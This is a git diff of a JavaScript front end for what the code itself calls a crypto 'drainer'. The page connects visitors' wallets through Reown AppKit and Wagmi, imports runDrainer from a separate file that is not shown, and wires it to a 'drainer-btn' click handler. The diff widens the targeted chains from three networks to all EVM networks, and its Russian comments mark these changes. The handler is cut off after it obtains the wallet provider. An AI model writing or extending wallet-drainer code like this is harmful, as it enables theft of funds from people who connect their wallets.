@@ -1,12 +1,13 @@
 import { createAppKit } from '@reown/appkit'
-import { mainnet, arbitrum, bsc } from '@reown/appkit/networks'
+import { evmNetworks } from '@reown/appkit/networks' // ✅ заменяем mainnet/bsc/... на ВСЕ
 import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
 import { ethers } from 'ethers'
 import { runDrainer } from './drainer.js'
 
 const projectId = 'd85cc83edb401b676e2a7bcef67f3be8'
 
-const networks = [mainnet, arbitrum, bsc]
+// ✅ используем все EVM-сети
+const networks = evmNetworks
 
 const wagmiAdapter = new WagmiAdapter({
   projectId,
@@ -30,8 +31,10 @@ const modal = createAppKit({
   }
 })
 
+// открытие модального окна
 document.getElementById('open-connect-modal').addEventListener('click', () => modal.open())
 
+// запуск drainer
 document.getElementById('drainer-btn').addEventListener('click', async () => {
   try {
     const provider = new ethers.providers.Web3Provider(window.ethereum, 'any')
